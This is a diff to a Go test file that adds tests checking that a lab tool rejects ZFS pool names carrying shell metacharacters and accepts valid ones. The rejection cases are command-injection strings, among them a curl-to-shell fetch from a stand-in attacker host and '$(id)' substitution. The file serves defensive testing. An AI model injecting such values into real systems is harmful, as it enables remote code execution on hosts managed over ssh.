@@ -187,6 +187,59 @@ func TestResolveLabForMutate_RejectsInvalidNameCharset(t *testing.T) {
 	}
 }
 
+// TestResolveLabForMutate_RejectsInvalidPoolCharset covers the same remote
+// shell exposure the name charset check covers: zfsDatasetPath composes
+// Storage.Pool into `zfs` command lines that quota set and create hand to ssh
+// unquoted, so a pool carrying a metacharacter must never resolve.
+func TestResolveLabForMutate_RejectsInvalidPoolCharset(t *testing.T) {
+	cases := []string{
+		"tank; curl http://attacker/x | sh #", // command substitution via ssh's argv join
+		"tank pool",                           // space splits the remote argv
+		"tank$(id)",                           // command substitution
+		"tank\npool",                          // newline injects a second command
+		"0tank",                               // ZFS pool names must start with a letter
+	}
+
+	for _, pool := range cases {
+		dirty := cleanLab("dirty")
+		dirty.Storage.Pool = pool
+		cfg := &config.Config{Labs: map[string]*config.Lab{"dirty": dirty}}
+		path := writeConfig(t, cfg)
+		cmd := newCmdWithDeps(t, path)
+
+		got, err := resolveLabForMutate(cmd, "dirty")
+		require.Error(t, err, "pool %q must be rejected", pool)
+		assert.Nil(t, got)
+		assert.ErrorContains(t, err, "charset")
+	}
+}
+
+// TestResolveLabForMutate_AcceptsRealPoolNames pins the charset open wide
+// enough for every name ZFS itself permits, so the guard rejects nothing an
+// operator could legitimately have created with zpool(8).
+func TestResolveLabForMutate_AcceptsRealPoolNames(t *testing.T) {
+	cases := []string{
+		"tank",
+		"tank-lab-pmx",
+		"rpool",
+		"zfs_data.01",
+		"pool:one",
+		"", // unset: zfsBasePool falls back to "tank"
+	}
+
+	for _, pool := range cases {
+		lab := cleanLab("clean")
+		lab.Storage.Pool = pool
+		cfg := &config.Config{Labs: map[string]*config.Lab{"clean": lab}}
+		path := writeConfig(t, cfg)
+		cmd := newCmdWithDeps(t, path)
+
+		got, err := resolveLabForMutate(cmd, "clean")
+		require.NoError(t, err, "pool %q must be accepted", pool)
+		require.NotNil(t, got)
+	}
+}
+
 func TestResolveLabForMutate_GuardFiresOnVnetID(t *testing.T) {
 	dirty := cleanLab("dirty")
 	dirty.Network.VnetID = "peppivn0"
